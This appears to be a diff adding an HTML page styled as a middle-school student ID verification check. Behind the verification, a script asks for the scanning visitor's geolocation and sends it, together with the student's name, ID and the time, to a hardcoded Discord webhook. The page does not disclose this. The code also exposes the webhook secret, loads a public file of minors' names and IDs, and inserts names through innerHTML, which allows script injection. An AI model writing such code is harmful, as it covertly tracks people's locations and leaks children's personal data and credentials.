@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>학생증 검증</title>
+    <style>
+        body { text-align: center; font-family: Arial, sans-serif; background: #1e1e22; color: #D9D9D9; }
+        .container { margin-top: 50px; padding: 20px; background: #18181c; border-radius: 10px; display: inline-block; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>학생증 검증 결과</h2>
+        <p id="result">확인 중...</p>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const studentID = params.get("studentID");
+
+        if (!studentID) {
+            document.getElementById("result").innerText = "유효하지 않은 QR 코드입니다.";
+        } else {
+            // 학생 정보 불러오기
+            fetch(`https://taejun09.github.io/jungang/student_data.json`)
+                .then(response => response.json())
+                .then(data => {
+                    const student = data.find(s => s.studentID === studentID);
+                    if (student) {
+                        document.getElementById("result").innerHTML = `
+                            <p>이름: ${student.name}</p>
+                            <p>학번: ${student.studentID}</p>
+                            <p>학교: 중앙중학교</p>
+                            <p style="color: lime;">✅ 학생증 인증 완료</p>
+                        `;
+                        sendDiscordLog(student.name, student.studentID);
+                    } else {
+                        document.getElementById("result").innerHTML = `<p style="color: red;">❌ 유효하지 않은 학생증입니다.</p>`;
+                    }
+                })
+                .catch(() => document.getElementById("result").innerText = "서버 오류 발생");
+        }
+
+        function sendDiscordLog(name, studentID) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const webhookURL = "https://discord.com/api/webhooks/1352639043908665384/Y0dX7q6Gv3PxYOdAo_ZwWYMoxdRBZcxRlYiIJVqM9WoVtEVuOk708SIdii4vy_qENjZi"; // 여기 디스코드 웹훅 URL 넣기
+                    const payload = {
+                        content: "📢 학생증 스캔 로그",
+                        embeds: [{
+                            title: "학생증이 스캔됨",
+                            fields: [
+                                { name: "이름", value: name, inline: true },
+                                { name: "학번", value: studentID, inline: true },
+                                { name: "위치", value: `위도: ${position.coords.latitude}, 경도: ${position.coords.longitude}`, inline: false },
+                                { name: "시간", value: new Date().toLocaleString("ko-KR"), inline: false }
+                            ],
+                            color: 3447003
+                        }]
+                    };
+                    fetch(webhookURL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload)
+                    });
+                }, () => console.log("위치 정보를 가져올 수 없음"));
+            }
+        }
+    </script>
+</body>
+</html>
